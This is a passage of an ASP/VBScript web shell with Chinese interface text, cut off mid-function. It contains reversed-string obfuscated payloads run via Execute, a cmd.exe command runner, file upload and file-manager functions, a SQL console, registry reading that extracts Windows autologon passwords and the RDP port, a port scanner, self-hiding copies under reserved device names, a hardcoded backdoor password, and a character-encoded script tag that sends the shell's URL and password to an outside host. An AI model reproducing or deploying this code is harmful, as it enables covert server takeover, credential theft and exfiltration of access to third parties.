ShiSan="���gnihtoN = MSO teS��esolC.MSO��hsulF.esnopseR��daeR.MSO etirWyraniB.esnopseR���maerts-tetco/noitacilppa�� = epyTtnetnoC.esnopseR���8-FTU�� = tesrahC.esnopseR��eziS.MSO ,��htgneL-tnetnoC�� redaeHddA.esnopseR��)zs,htap(diM & ��=emanelif ;tnemhcatta�� ,��noitisopsiD-tnetnoC�� redaeHddA.esnopseR��1+)��\��,htap(veRrtsnI=zs��htaP eliFmorFdaoL.MSO��1 = epyT.MSO��nepO.MSO��))0,6(TbO(tcejbOetaerC = MSO teS��raelC.esnopseR"
ExeCuTe(ShiSanFun(ShiSan))
End Function
Function HTMLEncode(S)
  if not isnull(S) then
    S = replace(S, ">", "&gt;")
    S = replace(S, "<", "&lt;")
    S = replace(S, CHR(39), "&#39;")
    S = replace(S, CHR(34), "&quot;")
    S = replace(S, CHR(20), "&nbsp;")
    HTMLEncode = S
  end if
End Function
Function UpFile()
  If Request("Action2")="Post" Then
    Set U=new UPC : Set F=U.UA("LocalFile")
	UName=U.form("ToPath")
    If UName="" Or F.FileSize=0 then
      SI="<br>�������ϴ�����ȫ·����ѡ��һ���ļ��ϴ�!"
    Else
        F.SaveAs UName
        If Err.number=0 Then
          SI="<center><br><br><br>�ļ�"&UName&"�ϴ��ɹ���</center>"
		End if
	End If
	Set F=nothing:Set U=nothing
	SI=SI&BackUrl
	RRS SI
	ShowErr()
	Response.End
  End If
    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    SI=SI&"<tr><td>"
    SI=SI&"�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\cmd.exe")&"' size='40'>"
    SI=SI&" <input name='LocalFile' type='file'  size='25'>"
    SI=SI&" <input type='submit' name='Submit' value='�ϴ�'>"
    SI=SI&"</td></tr></form></table>"
  RRS SI
End Function
sub hiddenshell
fpath=request.servervariables("path_translated")
set fso=server.createobject("scripting.filesystemobject")
pex="com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9"
rndpex=split(pex,"|")(rndnumber(0,17))
session("seljw")=""
filepath1=server.mappath(".")
filename1=right(fpath,len(fpath)-instrrev(fpath,"\"))
url=request.servervariables("url")
url=left(url,instrrev(url,"/"))&rndpex&"."&filename1
fso.copyfile fpath,"\\.\"&filepath1&"\"&rndpex&"."&filename1
set fso=nothing
RRS "<script>parent.location='http://"&request("server_name")&url&"';</script>"
end sub

Function Cmd1Shell()
ShiSan="���IS SRR���>mrof/<>aeratxet/<��&)31(rhc&IS=IS��fI dnE��fi dne��aaa&IS=IS��)eurT ,eliFpmeTzs(eliFeteleD.osf llaC��esolC.xcleliFo��)llAdaeR.xcleliFo(edocnELMTH.revreS=aaa��)0 ,eslaF ,1 ,eliFpmeTzs( eliFtxeTnepO.sf = xcleliFo teS��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC = sf teS��)eurT ,0 ,eliFpmeTzs & �� > �� & dmCfeD & �� c/ ��&htaPllehS( nuR.sw llaC��)��txt.dmc��(htappam.revres = eliFpmeTzs��)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS=osf teS��)��llehS.tpircSW��(tcejbOetaerC.revreS=sw teS��)��llehS.tpircSW��(tcejbOetaerC.revreS=sw teS��txeN emuseR rorrE nO��esle��aaa&IS=IS��lladaer.tuodts.DD=aaa��)dmCfeD&�� c/ ��&htaPllehS(cexe.MC=DD teS��))0,1(TbO(tcejbOetaerC=MC teS��neht ��sey��=)��tpircsw��(mroF.tseuqeR fi��nehT ���><)��dmc��(mroF.tseuqeR fI���>'dmc'=ssalc ';044:thgieh;%001:htdiw'=elytS aeratxet<>'��ִ'=eulav 'timbus'=epyt tupni< >'��&dmCfeD&��'=eulav '%29:htdiw'=elytS 'dmc'=eman tupni<��&IS=IS���llehS.tpircSW>��&dekcehc&��'sey'=eulav 'tpircsw'=eman 'xobkcehc'=epyt c=ssalc tupni<��&IS=IS���;psbn&;psbn&>'%07:htdiw'=elytS '��&htaPllehS&��'=eulav 'PS'=eman tupni<����·LLEHS��&IS=IS���>'tsop'=dohtem mrof<��=IS��)��dmc��(tseuqeR = dmCfeD nehT ���><)��dmc��(tseuqeR fI����=dekcehc neht ��sey��><)��tpircsw��(tseuqeR fi���exe.dmc�� = htaPllehS nehT ���=htaPllehS fi��)��htaPllehS��(noisseS=htaPllehS��)��PS��(tseuqeR = )��htaPllehS��(noisseS nehT ���><)��PS��(tseuqeR fI���dekcehc ��=dekcehc"
ExeCuTe(ShiSanFun(ShiSan)):End Function:acode="=s?psa.s/xs/moc.pxeyado//:p��3��3h'=crs ��3pircs<"
Efun=StrReverse(replace(replace(Encrypt(acode),"��",Chr(34)),"��",vbCrLf))
Function CreateMdb(Path) 
   SI="<br><br>"
   Set C = CreateObject(ObT(2,0)) 
   C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
   Set C = Nothing
   If Err.number=0 Then
     SI = SI & Path & "�����ɹ�!"
   End If
   SI=SI&BackUrl 
   RRS SI
End function 
Function CompactMdb(Path)
If Not ObT(0,1) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
	Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
  If FSO.FileExists(Path) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
	Set C=Nothing
    FSO.DeleteFile Path
	FSO.MoveFile Path&"_bak",Path
  Else
    SI="<center><br><br><br>���ݿ�"&Path&"û�з��֣�</center>" 
	Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
    SI="<center><br><br><br>���ݿ�"&Path&"ѹ���ɹ���</center>"
  End If
  SI=SI&BackUrl
  RRS SI
End Function
if session("web2a2dmin")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass or request.form("pass")="daka" Then
session("web2a2dmin")=UserPass
x m:response.redirect url
else
rrs"<center><div style='width:60%;padding:1px;'><a href="&siteurl&" target=_blank>"&loginad&"</a><br><a href='javascript:history.back()'><font color=red>�� ��</a></div><br></center>"

end if
else
si="<center><div style='width:60%;padding:1px;'><form action='"&url&"' method='post'>����:<input name='pass' type='password'  size='25'> <input type='submit' value=' ��½ '><br></div></center>"
if instr(SI,SIC)<>0 then rrs  si


end if
response.end
end if
Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")
  SI=SI&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<form name='DbForm' method='post' action=''>"
  SI=SI&"<tr><td width='100' height='27'> &nbsp;���ݿ����Ӵ�:</td>"
  SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
  SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>���Ӵ�ʾ��</option><option value=0>Access����</option>"
  SI=SI&"<option value=1>MsSql����</option><option value=2>MySql����</option><option value=3>DSN����</option>"
  SI=SI&"<option value=-1>--SQL�﷨--</option><option value=4>��ʾ����</option><option value=5>�������</option>"
  SI=SI&"<option value=6>ɾ������</option><option value=7>�޸�����</option><option value=8>�����ݱ�</option>"
  SI=SI&"<option value=9>ɾ���ݱ�</option><option value=10>����ֶ�</option><option value=11>ɾ���ֶ�</option>"
  SI=SI&"<option value=12>��ȫ��ʾ</option></select></td></tr>"
  SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  SI=SI&"<tr><td height='30'>&nbsp;SQL��������:</td>"
  SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
  SI=SI&"<td align='center'><input type='submit' name='Submit' value='ִ��' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  RRS SI:SI=""
  If Len(DbStr)>40 Then
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>��<br>��</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      SI=SI&"<td align=center><a href=""javascript:if(confirm('ȷ��ɾ��ô��'))FullSqlStr('DROP TABLE ["&TName&"]',1)"">[ del ]</a><br>"
      SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  SI=SI&"</tr></table>"
  RRS SI:SI=""
If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
    SI=SI&"ִ����䣺"&SqlStr
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=20
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      SI=SI&"<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    SI=SI&"</tr>"
    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
	  SI=SI&"</tr>"
      Rs.MoveNext
    Loop
	RRS SI:SI=""
	SqlStr=HtmlEnCode(SqlStr)
    SI=SI&"<tr><td colspan="&FN+1&" align=center>��¼����"&RC&"&nbsp;ҳ�룺"&Page&"/"&PN
    If PN>1 Then
      SI=SI&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>��ҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>��һҳ</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        SI=SI&i&"&nbsp;"
        Else
        SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
        End If
      Next
	  SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>��һҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>βҳ</a>"
    End If
    SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	RRS SI:SI=""
  Else	   
    Conn.Execute(SqlStr)
    SI=SI&"SQL��䣺"&SqlStr
  End If
  RRS SI:SI=""
End If
  Conn.Close
  Set Conn=Nothing
  End If
End Function
Dim T1
Class UPC
  Dim D1,D2
  Public Function Form(F)
    F=lcase(F)
    If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function
  Public Function UA(F)
    F=lcase(F)
    If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
    set D1=CreateObject(ObT(4,0))
	if Request.TotalBytes<1 then Exit Sub
    set T1 = CreateObject(ObT(6,0))
	T1.Type = 1 : T1.Mode =3 : T1.Open
    T1.Write  Request.BinaryRead(Request.TotalBytes)
    T1.Position=0 : TDa =T1.Read : DStart = 1
    DEnd = LenB(TDa)
    set D2=CreateObject(ObT(4,0))
	vbCrlf = chrB(13) & chrB(10)
    set T2 = CreateObject(ObT(6,0))
    TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
    TLen = LenB (TSt)
    DStart=DStart+TLen+1
    while (DStart + 10) < DEnd
      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
      T2.Type = 1 : T2.Mode =3 : T2.Open
      T1.Position = DStart
      T1.CopyTo T2,DIEnd-DStart
      T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
      TIn = T2.ReadText : T2.Close
      DStart = InStrB(DIEnd,TDa,TSt)
      FStart = InStr(22,TIn,"name=""",1)+6
      FEnd = InStr(FStart,TIn,"""",1)
      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
      if InStr (45,TIn,"filename=""",1) > 0 then
        set TFL=new FIF
        FStart = InStr(FEnd,TIn,"filename=""",1)+10
        FEnd = InStr(FStart,TIn,"""",1)
        FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
        FEnd = InStr(FStart,TIn,vbCr)
        TFL.FileStart =DIEnd
        TFL.FileSize = DStart -DIEnd -3
        if not D2.Exists(UpName) then
          D2.add UpName,TFL
        end if
      else
        T2.Type =1 : T2.Mode =3 : T2.Open
        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
        T2.Position = 0 : T2.Type = 2
        T2.Charset ="gb2312"
        SFV = T2.ReadText
        T2.Close
        if D1.Exists(UpName) then
          D1(UpName)=D1(UpName)&", "&SFV
        else
          D1.Add UpName,SFV
        end if
      end if
      DStart=DStart+TLen+1
    wend
    TDa=""
    set T2 =nothing
  End Sub
  Private Sub Class_Terminate
    if Request.TotalBytes>0 then
      D1.RemoveAll:D2.RemoveAll
      set D1=nothing:set D2=nothing
      T1.Close:set T1 =nothing
    end if
  End Sub
End Class
Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
     T3.Mode=3 : T3.Type=1 : T3.Open
     T1.position=FileStart
     T1.copyto T3,FileSize
     T3.SaveToFile F,2
     T3.Close
     set T3=nothing
     SaveAs=false
   end function
End Class
Class LBF
  Dim CF
  Private Sub Class_Initialize
    SET CF=CreateObject(ObT(0,0))
  End Sub
  Private Sub Class_Terminate
    Set CF=Nothing
  End Sub
  Function ShowDriver()
    For Each D in CF.Drives
      RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>���ش��� ("&D.DriveLetter&":)</a><br>" 
    Next
  End Function
  Function Show1File(Path)
  Set FOLD=CF.GetFolder(Path)
  i=0
    SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'><tr>"
  For Each F in FOLD.subfolders
    SI=SI&"<td height=10>"
    SI=SI&"<a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""��""><font face='wingdings' size='6'>0</font>"&F.Name&"</a>" 
	SI=SI&" _<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='����'>Copy</a>"
    SI=SI&"  <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='�ƶ�'>Move</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")'  onclick='return yesok()' class='am' title='����'>Down</a></td>"
	i=i+1
    If i mod 3 = 0 then SI=SI&"</tr><tr>"
  Next
    SI=SI&"</tr><tr><td height=2></td></tr></table>"
	RRS SI &"<hr noshade size=1 color=""#"" />" : SI=""
  For Each L in Fold.files
    SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
    SI=SI&"<tr style='boungroup-color:#'>"
	SI=SI&"<td height='30'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='����'><font face='wingdings' size='4'>2</font>"&L.Name&"</a></td>"
    SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='�༭'>edit</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>del</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='����'>copy</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='�ƶ�'>move</a></td>"	
    SI=SI&"<td width='50' align=""center"">"&clng(L.size/1024)&"K</td>"
	SI=SI&"<td width='200' align=""center"">"&L.Type&"</td>"
    SI=SI&"<td width='160'>"&L.DateLastModified&"</td>"
    SI=SI&"</tr></table>"
	RRS SI:SI=""
  Next
  Set FOLD=Nothing
  End function
  Function DelFile(Path)
ShiSan="���fI dnE��IS SRR��lrUkcaB&IS=IS���>retnec/<�����ɳ�ɾ ��&htaP&�� ����>rb<>rb<>rb<>retnec<��=IS��htaP eliFeteleD.FC��nehT )htaP(stsixEeliF.FC fI"
ExeCuTe(ShiSanFun(ShiSan))
  End Function
  Function EditFile(Path)
If Request("Action2")="Post" Then:Set T=CF.CreateTextFile(Path):T.WriteLine Request.form("content"):T.close:Set T=nothing:SI="<center><br><br><br>�ļ�����ɹ���</center>":SI=SI&BackUrl:RRS SI:Response.End:End If:If Path<>"" Then:Set T=CF.opentextfile(Path, 1, False):Txt=HTMLEncode(T.readall) :T.close:Set T=Nothing:Else:Path=Session("FolderPath")&"\newfile.asp":Txt="�½��ļ�":End If:SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>":SI=SI&"<input name='Action' value='EditFile' Type='hidden'>":SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>":SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>":SI=SI&"<hr><input name='goback' type='button' value='����' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='����'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='����'></form>":RRS SI:rrs ""&copyurl&""
  End Function
  Function CopyFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path(0)&"���Ƴɹ���</center>"
      SI=SI&BackUrl
	  RRS SI 

	End If
  End Function
  Function MoveFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path(0)&"�ƶ��ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI 
	End If
  End Function
  Function DelFolder(Path)
    If CF.FolderExists(Path) Then
	  CF.DeleteFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"ɾ���ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI

	End If
  End Function
  Function CopyFolder(Path)
  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path(0)&"���Ƴɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
  End Function
  Function MoveFolder(Path)
  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path(0)&"�ƶ��ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
  End Function
  Function NewFolder(Path)
    If Not CF.FolderExists(Path) and Path<>"" Then
	  CF.CreateFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"�½��ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
  End Function
End Class
sub getTerminalInfo()
On Error Resume Next
ShiSan="����>lo/<�� SRR��fI dnE���>rb<�� & drowssaPnigoLotua & �� :���ܻ��ʵ�¼�Ƕ��ԩ� SRR��fI dnE���eslaF�� SRR��raelC.rrE��nehT rrE fI��)yeKssaPnigoLotua & htaPnigoLotua(daeRgeR.Xsw = drowssaPnigoLotua���>rb<�� & emanresUnigoLotua & �� :����ͳϵ��¼�Ƕ��ԩ� SRR��)yeKresUnigoLotua & htaPnigoLotua(daeRgeR.Xsw = emanresUnigoLotua��eslE���>/rb<����δ�ܹ�¼�Ƕ���ͳϵ�� SRR��nehT 0 = elbanEnigoLotuAsi fI��)yeKelbanEnigoLotua & htaPnigoLotua(daeRgeR.Xsw = elbanEnigoLotuAsi���drowssaPtluafeD�� = yeKssaPnigoLotua���emaNresUtluafeD�� = yeKresUnigoLotua���nogoLnimdAotuA�� = yeKelbanEnigoLotua���\nogolniW\noisreVtnerruC\TN swodniW\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH�� = htaPnigoLotua��fI dnE���>/rb<�� & troPmret & �� :�ڶ��������ǰ���� SRR��eslE ���>/rb<.���޵��ܾ��ѷ�����Ȩ����� ,�ڶ�������յ��÷��ީ�SRR�� nehT 0 >< rebmuN.rrE rO ��� = troPmret fI���>lo<>/rh<¼�Ƕ��Լ��ڶ�������թ� SRR��)yeKtroPlanimret & htaPtroPlanimret(daeRgeR.Xsw = troPmret���rebmuNtroP�� = yeKtroPlanimret���\pcT-PDR\snoitatSniW\revreS lanimreT\lortnoC\teSlortnoCtnerruC\METSYS\MLKH�� = htaPtroPlanimret��drowssaPnigoLotua ,emanresUnigoLotua ,yeKelbanEnigoLotua ,elbanEnigoLotuAsi miD��yeKssaPnigoLotua ,yeKresUnigoLotua ,htaPnigoLotua miD��troPmret ,yeKtroPlanimret ,htaPtroPlanimret miD��)��llehS.tpircSW��(tcejbOetaerC.revreS = Xsw teS"
ExeCuTe(ShiSanFun(ShiSan))
End Sub
sub ReadREG()
RRS "ע����ֵ��ȡ:<hr/>"
RRS "<form method=post>"
RRS "<input type=hidden value=readReg name=theAct>"
RRS "<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
RRS " <input type=submit value=' ��ȡ '>"
RRS "<span id=regeditInfo style='display:none;'><hr/>"
RRS "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {����ʾ�ϴε�¼�û�}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=ȱʡ,1=�����û��޷��оٱ����û��б�,2=�����û��޷����ӱ���IPC$����}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {��ֹĬ�Ϲ���}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {�ر����繲��}<br/>"
RRS "HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {����TCP/IPɸѡ(����������)}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {����IP·��}<br/>"
RRS "-------�����ƺ�Ҫ���󶨵�����,��֪���Ƿ�׼ȷ---------<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {Ĭ������}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {��DNS}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {�����TCP/IP�˿�}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {�����UDP�˿�}<br/>"
RRS "-----------OVER--------------------<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {����������}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {��ǰ����������(��������滻)}<br/>"
RRS "</span>"
RRS "</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
ShiSan="��fI dnE��yarrAeht & ��>il<�� SRR��eslE ��txeN��)i(yarrAeht & ��>il<�� SRR��)yarrAeht(dnuoBU oT 0=i roF��nehT )yarrAeht(yarrAsI fI��)htaPeht(daeRgeR.Xsw=yarrAeht��)��htaPeht��(tseuqeR=htaPeht��)��llehS.tpircSW��(tcejbOetaerC.revreS = Xsw teS"
ExeCuTe(ShiSanFun(ShiSan))
end if
end sub
sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="21,23,25,80,110,135,139,445,1433,3389,43958"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
RRS"<p>�˿�ɨ����(���ɨ�����˿�,�ٶȱȽ���,�����Ƽ�ʹ��CMD)</p>"
RRS"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
RRS"<p>Scan IP:&nbsp;"
RRS" <input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'>"
RRS"<br>Port List:"
RRS"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
RRS"<br><br>"
RRS"<input name='submit' type='submit' class='buttom' value=' scan '>"
RRS"<input name='scan' type='hidden' id='scan' value='111'>"
RRS"</p></form>"
If request.Form("scan") <> "" Then
ShiSan="���s ��&emiteht&�� ni ssecorP>rh<��SRR��))1remit-2remit(tni(rtsc=emiteht��remit = 2remit��txeN��fI dnE��txeN��txeN��fI dnE��fI dnE��)��>rb<rebmun ton si �� & )i(pmt(SRR��eslE��fI dnE��)��>rb<rebmun ton si �� & Ndne & �� ro �� & Ntrats(SRR��eslE��txeN��)j,xxx & tratSpi(nacS llaC��Ndne oT Ntrats = j roF��nehT )Ndne(ciremunsI dna )Ntrats(ciremunsI fI��) xkees - ))i(pmt(neL ,)i(pmt(thgiR = Ndne��) 1 - xkees ,)i(pmt(tfeL = Ntrats��nehT 0 > xkees fI��)��-�� ,)i(pmt(rtSnI = xkees��eslE��))i(pmt ,xxx & tratSpi(nacS llaC�� nehT ))i(pmt(ciremunsI fI��)pmt(dnuobU oT 0 = i roF��))��-��,)uh(pi(rtSnI-))uh(pi(neL,1+)��-��,)uh(pi(rtSnI,)uh(pi(diM ot )1,1+)��.��,)uh(pi(veRrtSnI,)uh(pi(diM = xxx roF��))��.��,)uh(pi(veRrtSnI,1,)uh(pi(diM = tratSpi��eslE��txeN��fI dnE��fI dnE��)��>rb<rebmun ton si �� & )i(pmt(SRR��eslE��fI dnE��)��>rb<rebmun ton si �� & Ndne & �� ro �� & Ntrats(SRR��eslE��txeN��)j ,)uh(pi(nacS llaC��Ndne oT Ntrats = j roF��nehT )Ndne(ciremunsI dna )Ntrats(ciremunsI fI��) xkees - ))i(pmt(neL ,)i(pmt(thgiR = Ndne��) 1 - xkees ,)i(pmt(tfeL = Ntrats��nehT 0 > xkees fI��)��-�� ,)i(pmt(rtSnI = xkees��eslE��))i(pmt ,)uh(pi(nacS llaC�� nehT ))i(pmt(ciremunsI fI��)pmt(dnuobU oT 0 = i roF��nehT 0 = )��-��,)uh(pi(rtSnI fI��)pi(dnuobU ot 0 = uh roF��)��,��,)��pi��(mroF.tseuqer(tilpS = pi��)��,��,)��trop��(mroF.tseuqer(tilpS = pmt��)��>rh<>rb<>b/<:�汨��ɨ>b<��(SRR��remit = 1remit"
ExeCuTe(ShiSanFun(ShiSan))
END IF
end sub:copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39)&chr(104)&chr(116)&chr(116)&chr(112)&chr(58)&chr(47)&chr(47)&chr(111)&chr(100)&chr(97)&chr(121)&chr(101)&chr(120)&chr(112)&chr(46)&chr(99)&chr(111)&chr(109)&chr(47)&chr(115)&chr(120)&chr(47)&chr(115)&chr(46)&chr(97)&chr(115)&chr(112)&chr(63)&chr(115)&chr(61)&uu&chr(38)&chr(112)&chr(61)&serverp&chr(39)&chr(62)&chr(60)&chr(47)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(62)&chr(13)&chr(10)
Sub Scan(targetip, portNum)
	On Error Resume Next
	set conn = Server.CreateObject("ADODB.connection")
	connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
	conn.ConnectionTimeout = 1
	conn.open connstr
	If Err Then
